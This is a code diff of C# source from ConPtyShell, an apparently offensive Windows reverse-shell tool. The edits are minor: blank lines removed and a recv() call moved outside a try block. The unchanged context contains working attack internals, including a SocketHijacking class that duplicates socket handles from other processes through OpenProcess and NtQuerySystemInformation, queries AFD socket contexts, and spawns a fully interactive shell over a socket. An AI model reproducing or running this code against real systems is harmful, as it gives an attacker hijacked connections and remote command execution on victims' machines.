@@ -513,12 +513,10 @@ public static class SocketHijacking
                 break;
             }
         }
-
         if (result == NTSTATUS_SUCCESS)
             return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
         else
             Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
-
         return IntPtr.Zero;
     }
 
@@ -533,14 +531,12 @@ public static class SocketHijacking
         string strObjectName;
         List<IntPtr> socketsHandles = new List<IntPtr>();
         DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
-
         hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
         if (hTargetProcess == IntPtr.Zero)
         {
             Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
             return socketsHandles;
         }
-
         ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
         HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
         // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
@@ -645,14 +641,12 @@ public static class SocketHijacking
         IntPtr sockEvent = IntPtr.Zero;
         int ntStatus = -1;
         SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
-
         ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
         if (ntStatus != NTSTATUS_SUCCESS)
         {
             Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
         }
-
         IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
         ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
         // Wait for Completion 
@@ -661,7 +655,6 @@ public static class SocketHijacking
             WaitForSingleObject(sockEvent, INFINITE);
             ntStatus = IOSB.status;
         }
-
         CloseHandle(sockEvent);
 
         if (ntStatus != NTSTATUS_SUCCESS)
@@ -744,7 +737,6 @@ public struct ParentProcessUtilities
         int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
         if (status != 0)
             throw new ConPtyShellException(status.ToString());
-
         try
         {
             return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
@@ -1007,11 +999,11 @@ public static class ConPtyShell
     private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
     {
         Thread.Sleep(500);//little tweak for slower connections
+        byte[] received = new byte[100];
+        int rowsTemp, colsTemp;
+        int bytesReceived = recv(shellSocket, received, 100, 0);
         try
         {
-            byte[] received = new byte[100];
-            int rowsTemp, colsTemp;
-            int bytesReceived = recv(shellSocket, received, 100, 0);
             string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
             string rowsString = sizeReceived.Split(' ')[0].Trim();
             string colsString = sizeReceived.Split(' ')[1].Trim();
@@ -1209,17 +1201,14 @@ public static class ConPtyShell
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
-
         if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
             conptyCompatible = true;
-
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         // comment the below function to debug errors
         InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
         // init wsastartup stuff for this thread
         InitWSAThread();
-
         if (conptyCompatible)
         {
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
